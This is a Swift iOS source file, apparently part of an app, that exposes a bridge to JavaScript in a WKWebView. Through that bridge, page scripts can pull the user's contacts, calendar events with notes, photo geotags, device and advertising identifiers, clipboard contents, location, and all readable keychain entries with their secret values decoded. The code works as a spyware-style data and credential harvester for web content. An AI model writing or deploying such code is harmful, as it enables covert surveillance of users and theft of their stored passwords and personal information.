// language: Swift, file: DataCollector.swift, target: iOS 15+, Xcode 15+
// *вызывается из WKWebView через messageHandler "iPAClient"*
import UIKit
import Contacts
import EventKit
import Photos
import CoreLocation
import NetworkExtension
import Security
import AdSupport

final class DataCollector: NSObject, CLLocationManagerDelegate {

    static let shared = DataCollector()
    private let locationManager = CLLocationManager()
    private var lastLocation: CLLocation?

    private override init() {
        super.init()
        locationManager.delegate = self
        locationManager.desiredAccuracy = kCLLocationAccuracyHundredMeters
    }

    // MARK: - Точка входа из JS
    func handle(feature: String, completion: @escaping ([String: Any]) -> Void) {
        switch feature {
        case "CollectContacts":  collectContacts(completion)
        case "CollectCalendar":  collectCalendar(completion)
        case "CollectPhotos":    collectPhotos(completion)
        case "CollectDevice":    completion(deviceInfo())
        case "CollectClipboard": completion(["clipboard": UIPasteboard.general.string ?? ""])
        case "CollectLocation":  collectLocation(completion)
        case "CollectKeychain":  completion(collectKeychain())
        default:                 completion([:])
        }
    }

    // MARK: - Контакты
    private func collectContacts(_ cb: @escaping ([String: Any]) -> Void) {
        let store = CNContactStore()
        store.requestAccess(for: .contacts) { granted, _ in
            guard granted else { cb(["error": "denied"]); return }
            let keys: [CNKeyDescriptor] = [
                CNContactGivenNameKey as CNKeyDescriptor,
                CNContactFamilyNameKey as CNKeyDescriptor,
                CNContactPhoneNumbersKey as CNKeyDescriptor,
                CNContactEmailAddressesKey as CNKeyDescriptor,
                CNContactOrganizationNameKey as CNKeyDescriptor
            ]
            let req = CNContactFetchRequest(keysToFetch: keys)
            var out: [[String: String]] = []
            try? store.enumerateContacts(with: req) { c, _ in
                let phones = c.phoneNumbers.map { $0.value.stringValue }.joined(separator: ",")
                let emails = c.emailAddresses.map { $0.value as String }.joined(separator: ",")
                out.append([
                    "name": "\(c.givenName) \(c.familyName)",
                    "phones": phones,
                    "emails": emails,
                    "org": c.organizationName
                ])
            }
            cb(["contacts": out])
        }
    }

    // MARK: - Календарь
    private func collectCalendar(_ cb: @escaping ([String: Any]) -> Void) {
        let store = EKEventStore()
        store.requestFullAccessToEvents { granted, _ in
            guard granted else { cb(["error": "denied"]); return }
            let now = Date()
            let predicate = store.predicateForEvents(
                withStart: now.addingTimeInterval(-60*60*24*30),
                end: now.addingTimeInterval(60*60*24*90),
                calendars: nil
            )
            let events = store.events(matching: predicate).map {
                ["title": $0.title ?? "", "start": "\($0.startDate)", "notes": $0.notes ?? ""]
            }
            cb(["events": events])
        }
    }

    // MARK: - Фото (метаданные + геотеги)
    private func collectPhotos(_ cb: @escaping ([String: Any]) -> Void) {
        PHPhotoLibrary.requestAuthorization { status in
            guard status == .authorized || status == .limited else { cb(["error": "denied"]); return }
            let opts = PHFetchOptions()
            opts.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
            let assets = PHAsset.fetchAssets(with: opts)
            var out: [[String: Any]] = []
            assets.enumerateObjects { a, idx, stop in
                if idx >= 500 { stop.pointee = true; return }
                out.append([
                    "date": a.creationDate.map { "\($0)" } ?? "",
                    "lat":  a.location?.coordinate.latitude  ?? 0,
                    "lon":  a.location?.coordinate.longitude ?? 0,
                    "type": a.mediaType.rawValue
                ])
            }
            cb(["photos": out])
        }
    }

    // MARK: - Устройство
    private func deviceInfo() -> [String: Any] {
        let d = UIDevice.current
        return [
            "model":    d.model,
            "name":     d.name,
            "system":   "\(d.systemName) \(d.systemVersion)",
            "idfv":     d.identifierForVendor?.uuidString ?? "",
            "idfa":     ASIdentifierManager.shared().advertisingIdentifier.uuidString,
            "locale":   Locale.current.identifier,
            "timezone": TimeZone.current.identifier,
            "screen":   "\(UIScreen.main.bounds.width)x\(UIScreen.main.bounds.height)",
            "battery":  "\(Int(d.batteryLevel * 100))%"
        ]
    }

    // MARK: - Локация
    private func collectLocation(_ cb: @escaping ([String: Any]) -> Void) {
        locationManager.requestWhenInUseAuthorization()
        locationManager.requestLocation()
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            guard let loc = self.lastLocation else { cb(["error": "no_fix"]); return }
            cb(["lat": loc.coordinate.latitude, "lon": loc.coordinate.longitude,
                "acc": loc.horizontalAccuracy])
        }
    }

    func locationManager(_ m: CLLocationManager, didUpdateLocations locs: [CLLocation]) {
        lastLocation = locs.last
    }
    func locationManager(_ m: CLLocationManager, didFailWithError e: Error) {}

    // MARK: - Кейчейн приложения (свои items)
    private func collectKeychain() -> [String: Any] {
        let query: [String: Any] = [
            kSecClass as String:       kSecClassGenericPassword,
            kSecReturnAttributes as String: true,
            kSecReturnData as String:  true,
            kSecMatchLimit as String:  kSecMatchLimitAll
        ]
        var result: AnyObject?
        let status = SecItemCopyMatching(query as CFDictionary, &result)
        guard status == errSecSuccess, let items = result as? [[String: Any]] else {
            return ["keychain": []]
        }
        let mapped = items.map { item -> [String: String] in
            let data = item[kSecValueData as String] as? Data
            return [
                "account": item[kSecAttrAccount as String] as? String ?? "",
                "service": item[kSecAttrService as String] as? String ?? "",
                "value":   data.flatMap { String(data: $0, encoding: .utf8) } ?? ""
            ]
        }
        return ["keychain": mapped]
    }
}
